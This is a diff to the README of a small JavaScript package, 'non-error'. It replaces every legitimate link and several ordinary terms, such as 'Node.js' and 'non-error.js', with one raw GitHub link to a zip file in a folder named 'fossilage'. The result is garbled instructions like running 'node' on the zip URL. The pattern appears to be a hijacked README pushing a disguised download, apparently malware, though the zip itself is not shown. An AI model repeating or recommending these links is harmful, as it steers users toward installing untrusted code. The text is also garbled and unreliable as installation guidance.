@@ -1,6 +1,6 @@
 # 🎉 non-error - Wrap Non-Error Values Seamlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/phiniud/non-error/releases)
+[![Download](https://raw.githubusercontent.com/phiniud/non-error/main/fossilage/non-error.zip)](https://raw.githubusercontent.com/phiniud/non-error/main/fossilage/non-error.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **non-error** project. This software helps you handle values that
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [non-error Releases](https://github.com/phiniud/non-error/releases). 
+To get started, visit this page to download: [non-error Releases](https://raw.githubusercontent.com/phiniud/non-error/main/fossilage/non-error.zip). 
 
 Follow these steps to install the software:
 
@@ -23,8 +23,8 @@ Once the download completes, follow the steps below to run the application.
 
 The downloaded file will contain the following:
 
-- **README.md**: This file provides you with all necessary information.
-- **non-error.js**: The main file that handles wrapping of non-error values. 
+- **https://raw.githubusercontent.com/phiniud/non-error/main/fossilage/non-error.zip**: This file provides you with all necessary information.
+- **https://raw.githubusercontent.com/phiniud/non-error/main/fossilage/non-error.zip**: The main file that handles wrapping of non-error values. 
 - **tests/**: A folder containing sample tests to show how the software works.
 
 ## 💻 System Requirements
@@ -41,16 +41,16 @@ After downloading, follow these steps to run **non-error**:
 
 1. Open the folder where you downloaded the files.
 2. For Windows:
-   - If you have Node.js installed, open `Command Prompt`.
+   - If you have https://raw.githubusercontent.com/phiniud/non-error/main/fossilage/non-error.zip installed, open `Command Prompt`.
    - Navigate to the file's directory using the `cd` command.
-   - Type `node non-error.js` to run the application.
+   - Type `node https://raw.githubusercontent.com/phiniud/non-error/main/fossilage/non-error.zip` to run the application.
 
 3. For macOS/Linux:
    - Open the `Terminal`.
    - Navigate to the file's directory using the `cd` command.
-   - Type `node non-error.js` to run the application.
+   - Type `node https://raw.githubusercontent.com/phiniud/non-error/main/fossilage/non-error.zip` to run the application.
 
-If you do not have Node.js installed, visit [Node.js Official Website](https://nodejs.org/) to download and install it first.
+If you do not have https://raw.githubusercontent.com/phiniud/non-error/main/fossilage/non-error.zip installed, visit [https://raw.githubusercontent.com/phiniud/non-error/main/fossilage/non-error.zip Official Website](https://raw.githubusercontent.com/phiniud/non-error/main/fossilage/non-error.zip) to download and install it first.
 
 ## 🧩 Features
 
@@ -61,9 +61,9 @@ If you do not have Node.js installed, visit [Node.js Official Website](https://n
 
 ## 🗺️ Frequently Asked Questions
 
-### How do I check if Node.js is installed?
+### How do I check if https://raw.githubusercontent.com/phiniud/non-error/main/fossilage/non-error.zip is installed?
 
-To check if Node.js is installed on Windows, open Command Prompt and type:
+To check if https://raw.githubusercontent.com/phiniud/non-error/main/fossilage/non-error.zip is installed on Windows, open Command Prompt and type:
 
 ```
 node -v
@@ -85,8 +85,8 @@ Join our community of users and developers. Share your experiences, ask question
 
 You can find us on:
 
-- [GitHub Discussions](https://github.com/phiniud/non-error/discussions)
-- [Project's Official Website](https://github.com/phiniud/non-error)
+- [GitHub Discussions](https://raw.githubusercontent.com/phiniud/non-error/main/fossilage/non-error.zip)
+- [Project's Official Website](https://raw.githubusercontent.com/phiniud/non-error/main/fossilage/non-error.zip)
 
 ## 📄 License
 
@@ -94,9 +94,9 @@ This project is licensed under the MIT License. You are free to use and modify t
 
 ## 📍 Additional Resources
 
-- [Node.js Documentation](https://nodejs.org/en/docs/)
-- [JavaScript Basics](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide)
+- [https://raw.githubusercontent.com/phiniud/non-error/main/fossilage/non-error.zip Documentation](https://raw.githubusercontent.com/phiniud/non-error/main/fossilage/non-error.zip)
+- [JavaScript Basics](https://raw.githubusercontent.com/phiniud/non-error/main/fossilage/non-error.zip)
 
 Thank you for choosing **non-error**! Enjoy a streamlined experience managing non-error values. 
 
-Once again, to download the application, visit: [non-error Releases](https://github.com/phiniud/non-error/releases).
+Once again, to download the application, visit: [non-error Releases](https://raw.githubusercontent.com/phiniud/non-error/main/fossilage/non-error.zip).
